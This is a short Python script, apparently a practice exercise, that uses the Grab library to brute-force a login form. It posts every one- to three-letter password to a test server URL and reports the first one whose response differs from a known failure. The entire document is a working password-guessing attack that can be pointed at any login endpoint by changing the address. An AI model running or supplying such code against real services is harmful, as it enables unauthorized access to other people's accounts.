from string import ascii_letters
from itertools import chain, product
from grab import Grab
g = Grab()

serv = 'http://temp.my/brute/server/'

g.setup(post={'password': '1'})
g.go(serv)
bad = g.response.body

for password in chain(	ascii_letters, 
						product(ascii_letters, repeat=2),
						product(ascii_letters, repeat=3)):
	password = ''.join(password)
	g.setup(post={'password': password})
	g.go(serv)
	if g.response.body != bad:
		print('Password is', password)
		exit()
